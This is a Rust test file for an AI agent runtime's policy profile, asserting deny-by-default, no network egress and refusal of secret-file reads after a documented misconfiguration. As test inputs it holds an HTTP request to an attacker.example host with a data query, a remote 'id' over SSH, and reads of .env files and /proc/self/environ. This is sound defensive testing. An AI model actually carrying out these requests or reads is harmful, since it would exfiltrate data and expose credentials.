//! The shipped reference profile (`x0ne-runtime/x0ne-runtime.toml`, what
//! `make install` deposits) is a deny-by-default policy that names every
//! action it allows, and keeps network egress off.
//!
//! Measured on 2026-10-05 before the fix: `default_effect = "allow"` at line
//! 43 while `docs/security.md` and `SECURITY.md` promise deny-by-default, and
//! the `[actions]` table listed 45 of the vocabulary — the rest fell through
//! `default_effect`. Under `action_defaults = "replace"` that is every action
//! the operator did not name, `HttpRequest` and `SshExec` included.
//!
//! Loaded through `AppConfig::load`, the production loader, never parsed by
//! hand (`policy_matrix.rs` explains why).

use std::collections::BTreeMap;
use std::path::PathBuf;

use x0ne_actions::Action;
use x0ne_runtime::config::AppConfig;
use x0ne_runtime::policy::{DenyReason, PolicyEffect, PolicyEngine};

fn shipped() -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("x0ne-runtime.toml")
}

fn loaded() -> AppConfig {
    AppConfig::load(&shipped()).expect("the reference profile loads")
}

/// The same file with `action_defaults = "replace"` inside `[policy]`, so
/// that nothing falls through to the compiled-in defaults.
fn loaded_without_defaults() -> AppConfig {
    let text = std::fs::read_to_string(shipped()).unwrap();
    let marker = "default_effect = ";
    let at = text.find(marker).expect("the profile sets default_effect");
    let eol = text[at..].find('\n').map(|i| at + i).unwrap_or(text.len());
    let replaced = format!(
        "{}\naction_defaults = \"replace\"{}",
        &text[..eol],
        &text[eol..]
    );
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("x0ne-runtime.toml");
    std::fs::write(&path, replaced).unwrap();
    AppConfig::load(&path).expect("the strict variant loads")
}

fn engine(cfg: &AppConfig) -> PolicyEngine {
    PolicyEngine::new(cfg.clone(), cfg.actions.clone())
}

#[test]
fn the_reference_profile_denies_by_default() {
    assert_eq!(
        loaded().policy.default_effect,
        "deny",
        "x0ne-runtime.toml contradicts SECURITY.md: what it does not name is allowed"
    );
}

#[test]
fn the_reference_profile_names_every_action_it_allows() {
    let merged: BTreeMap<_, _> = loaded().actions.into_iter().collect();
    let strict: BTreeMap<_, _> = loaded_without_defaults().actions.into_iter().collect();
    let unnamed: Vec<&String> = merged.keys().filter(|k| !strict.contains_key(*k)).collect();
    assert!(
        unnamed.is_empty(),
        "{} action(s) fall through default_effect instead of being named: {unnamed:?}",
        unnamed.len()
    );
    assert_eq!(merged, strict, "naming an action changed its value");
}

#[test]
fn the_reference_profile_keeps_network_egress_off() {
    let cfg = loaded();
    // The two probes stay on: the orchestrator waives them for the loopback
    // only and asks a human for any other host (`agent/readonly_net.rs`).
    let probes = ["DnsLookup", "PortCheck"];
    let on: Vec<&str> = x0ne_actions::GENERATED_ACTIONS
        .iter()
        .filter(|m| m.class == "Network" && !probes.contains(&m.name))
        .filter(|m| cfg.actions.get(m.name).copied().unwrap_or(false))
        .map(|m| m.name)
        .collect();
    assert!(
        on.is_empty(),
        "network actions enabled by the reference profile: {on:?}"
    );

    let eng = engine(&cfg);
    for json in [
        serde_json::json!({"type": "HttpRequest", "url": "https://attacker.example/?d=x", "method": "GET"}),
        serde_json::json!({"type": "FetchUrl", "url": "https://attacker.example/?d=x"}),
        serde_json::json!({"type": "SshExec", "host": "h", "command": "id"}),
        serde_json::json!({"type": "WebSearch", "query": "x"}),
    ] {
        let action: Action = serde_json::from_value(json.clone()).unwrap();
        assert!(
            matches!(eng.evaluate(&action), PolicyEffect::Deny(_)),
            "{json} is not refused by the reference profile"
        );
    }
}

#[test]
fn the_reference_profile_denies_the_shared_secret_patterns() {
    let cfg = loaded();
    for pat in x0ne_actions::deny_paths::DEFAULT_DENY_PATH_PATTERNS {
        assert!(
            cfg.policy.deny_path_patterns.iter().any(|p| p == pat),
            "the reference profile dropped the shared default pattern {pat}"
        );
    }
    // A `.env` under an allowed root is still refused, by the pattern and
    // not by the roots: the roots are what an operator widens.
    let home = std::env::var("HOME").unwrap();
    std::fs::create_dir_all(format!("{home}/code")).unwrap();
    let eng = engine(&cfg);
    for path in [
        format!("{home}/code/.env"),
        format!("{home}/code/api/.env.production"),
        "/proc/self/environ".to_string(),
    ] {
        let action = Action::ReadFile {
            path: path.clone(),
            offset: 0,
            limit: None,
            start_line: None,
            limit_lines: None,
        };
        match eng.evaluate(&action) {
            PolicyEffect::Deny(DenyReason::PathMatchesDenyPattern { .. }) => {}
            other => panic!("{path}: expected a deny-pattern refusal, got {other:?}"),
        }
    }
}
